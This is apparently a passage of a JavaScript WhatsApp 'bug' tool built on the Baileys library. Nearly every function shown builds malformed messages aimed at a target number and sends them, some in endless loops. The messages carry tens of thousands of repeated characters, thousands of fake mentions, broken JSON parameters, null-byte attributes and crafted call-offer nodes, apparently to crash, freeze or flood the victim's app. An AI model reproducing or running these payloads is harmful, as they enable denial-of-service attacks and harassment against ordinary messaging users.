                            "‼️⃟̊  ༚Ꮡ‌‌ ⭑̤ ⟅̊ 𝚲𝐏͢𝐏𝚯𝐋͢𝚯݉ ، ▾ ► 𝚵𝐗͢𝐏𝐋𝚫͢𝐍𝚫𝐓͢𝚰𝚯𝚴͢𝚾  ◄ ⟆ ⭑̤" +
                            "ꦽ".repeat(45000),
                        description: "👀",
                        listType: 1,
                        singleSelectReply: {
                            selectedRowId:
                                " - dewi aku mohon beri kesempatan\n" +
                                "untuk bisa menebus dosaku kepadamu\n" +
                                "maafkanlah aku yg menyakitimu\n" +
                                "aku tidak pernah menyangka bisa begini"
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120363403393294060@newsletter",
                                severMessageId: "1",
                                newsletterName: "# How Do I Get Through This ?",
                                contentType: "UPDATE_LINK"
                            }
                        }
                    }
                }
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
}

async function aviciFull(sock, target) {
  await antiSpamDelay(); 
  try {
    let message1 = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            name: "avici hard",
            address: "avici",
            comment: "avici",
            accuracyInMeters: 1,
            degreesLatitude: 111.45231,
            degreesLongitude: 111.45231,
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 3000 },
                  () =>
                    "628" +
                    Math.floor(Math.random() * 10000000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg1 = generateWAMessageFromContent(target, message1, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
    let message2 = {
      viewOnceMessage: {
        message: {
          buttonsResponseMessage: {
            selectedButtonId: "List",
            selectedDisplayText: "Bomber",
            type: 1,
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 3000 },
                  () =>
                    "628" +
                    Math.floor(Math.random() * 10000000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg2 = generateWAMessageFromContent(target, message2, {});

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

  } catch (err) {
    console.log(err);
  }
}
 
async function occolotopys(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  let CallAudio = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch { }
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let AudioLite = CallAudio();
  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let BufferDelete = sock.createParticipantNodes.bind(sock);
  let encodeBuffer = sock.encodeWAMessage?.bind(sock);
  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let participateNode = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(participateNode.map(async ({ recipientJid: jid, message: msg }) => {

      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;

      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));

      return AudioLite.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });

    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };
  let BytesType = crypto.randomBytes(32);
  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);

  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );
  let DecodeCall = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(DecodeCall);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "Me Xwar",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });
}

async function aesystm(target) {
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`); 

await sock.assertSessions(devices) 

const {
    encodeSignedDeviceIdentity,
    jidEncode,
    encodeWAMessage,
    patchMessageBeforeSending,
    encodeNewsletterMessage
  } = require("@whiskeysockets/baileys");
    
    let xnxx = () => {
    let map = {};
    return {
    mutex(key, fn) {
    map[key] ??= { task: Promise.resolve() };
    map[key].task = (async prev => {
    try { await prev; } catch {}
    return fn();
    })(map[key].task);
    return map[key].task;
    }
    };
    };

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = sock.createParticipantNodes.bind(sock);
let yntkts = sock.encodeWAMessage?.bind(sock);
sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(target => ({ recipientJid: target, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: target, message: msg }) => {
let { user: targetUser } = jidDecode(target);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = target === meId || target === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(target, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ target, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { target },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};

await sock.sendNode(lemiting);
}

async function croserd(sock, target) {
  let textSent = false;
  while (true) {
    if (!global.__flyingLimit) global.__flyingLimit = {};
    if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();

    const delay = ms => new Promise(r => setTimeout(r, ms));

    global.__flyingMutex = global.__flyingMutex.then(async () => {
      let last = global.__flyingLimit[target] || 0;
      let now = Date.now();
      let wait = last + (1000 + Math.random() * 500) - now;
      if (wait > 0) await delay(wait);
      global.__flyingLimit[target] = Date.now();
    });

    await global.__flyingMutex;
    let devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);
    let xnxx = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {};
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {

      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let arrayMsg = Array.isArray(patched)
        ? patched
        : recipientJids.map(target => ({ recipientJid: target, message: patched }));

      let { id: meId, lid: meLid } = sock.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(arrayMsg.map(async ({ recipientJid: target, message: msg }) => {
        let { user: targetUser } = jidDecode(target);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let isMe = target === meId || target === meLid;
        if (dsmMessage && isOwnUser && !isMe) msg = dsmMessage;

        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

        return memek.mutex(target, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
            target,
            data: bytes
          });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { target },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });

      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };
    let { nodes: destinations, shouldIncludeDeviceIdentity } =
      await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
      tag: "call",
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8", dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity
            ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }]
            : [])
        ]
      }]
    };

    await sock.sendNode(callNode);
    if (!textSent) {

      const TextMsg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "Hallo",
          contextInfo: {
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }, {});

      await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
      await sock.sendMessage(target, { delete: TextMsg.key });
      textSent = true;
    }

  }
}

async function protocoldelay10(sock, target, mention = true) {
  while (true) {
    const sticker = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
        mimetype: "image/webp",
        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
        fileLength: 1173741,
        mediaKeyTimestamp: Date.now(),
        isAnimated: true
      }
    };

    const msgSticker = generateWAMessageFromContent(
      "status@broadcast",
      { ephemeralMessage: { message: sticker, ephemeralExpiration: 259200 } },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msgSticker.message, {
      messageId: msgSticker.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    const image = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/d/f/Z9Y8X7W6V5U4T3S2R1Q0.jpg?ccb=11-4",
        mimetype: "image/jpeg",
        fileSha256: "h8O0mH7mY2H0p0J8m4wq2EoX5J2mP2z9S3oG3y1b2nQ=",
        fileEncSha256: "Vgkq2c2c1m3Y8F0s7f8c3m9V1a2b3c4d5e6f7g8h9i0=",
        mediaKey: "4n0Ck3yVb6b4T2h1u8V7s6Q5p4O3i2K1l0M9n8B7v6A=",
        fileLength: 245781,
        directPath: "",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [2437, 17332],
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
            )
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      {
        ephemeralMessage: {
          message: { viewOnceMessage: { message: image } },
          ephemeralExpiration: 259200
        }
      },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    const documentPayload = {
      documentMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/546070134_1487354876439973_4934366613744511451_n.enc?ccb=11-4&oh=01_Q5Aa3AHZ25X4h4cEiDw5S7ikFqbvcfasFd5bt7ERcpGKuq0GNg&oe=695046D5&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/json",
        fileSha256: "epXLk8bPeY1T3Qifs7Ue7WbyFWcA0qfQ0HyLVeFddnI=",
        fileLength: "14",
        pageCount: 0,
        mediaKey: "bWsJTES/rTf/vD5lj5BheCyLEhfgraMT1nS90JfN6Xk=",
        fileName: "Xyraa Cantikkk.json",
        fileEncSha256: "szNhyOWFuDNL7EhYqO8bg9V5ftmWG4u0BNXrDSWO+UM=",
        directPath: "/v/t62.7119-24/546070134_1487354876439973_4934366613744511451_n.enc?ccb=11-4&oh=01_Q5Aa3AHZ25X4h4cEiDw5S7ikFqbvcfasFd5bt7ERcpGKuq0GNg&oe=695046D5&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1764290199",
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: false
          }
        }
      },
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "kaPH00df40NOuiL8ZTz7kZc3yUx6Qqbh7YGiVhKUmPk="
      }
    };

    const msgDoc = generateWAMessageFromContent(
      "status@broadcast",
      {
        ephemeralMessage: {
          message: { viewOnceMessage: { message: documentPayload } },
          ephemeralExpiration: 259200
        }
      },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msgDoc.message, {
      messageId: msgDoc.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(50000) },
              content: undefined
            }
          ]
        }
      );
    }
  }
}

async function Carouselsock(sock, target) {
    console.log(chalk.red(`OVALIUM SENDING BUG`));
    for (let i = 0; i < 75; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "XWAR" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "XWAR" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "XWAR" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `§sockUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );

    // Pengiriman dengan format yang diminta tanpa mention
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
    }
}

async function BlankUiTypeDelete(sock, target) {
  let usertitle = "Expppppppajdk" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(45000);
  let cards = [];
  let push = [];
  
  let buttons = [
    {
      name: "single_select",
      buttonParamsJson: "",
    },
  ];
  
  for (let i = 0; i < 2000; i++) {
    buttons.push(
      {
        name: "send_location",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
      {
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
      {
        name: "cta_catalog",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
      {
        name: "mpm",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
      {
        name: "catalog_message",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
      {
        name: "call_permission_request",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
